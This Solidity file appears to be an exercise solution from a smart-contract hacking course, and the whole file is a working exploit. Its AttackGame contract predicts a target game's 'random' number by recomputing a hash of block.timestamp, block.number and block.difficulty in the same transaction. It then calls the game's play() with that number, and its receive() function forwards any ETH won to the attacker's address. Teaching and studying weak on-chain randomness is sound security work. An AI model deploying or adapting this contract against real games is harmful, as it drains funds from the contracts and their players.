// SPDX-License-Identifier: MIT
// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policyGPL-3.0-or-later
pragma solidity ^0.8.13;

interface IGame {
  function play(uint guess) external;
}

contract AttackGame {

  IGame game;
  address public owner;
  constructor(address _gameAddress) {
    game = IGame(_gameAddress);
    owner = msg.sender;
  }

  function attack() external {
    uint number = uint(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
    game.play(number);
  }

  receive() external payable {
    (bool sent, ) = owner.call{value: address(this).balance}("");
    require(sent, "Failed to send ETH");
  }

}
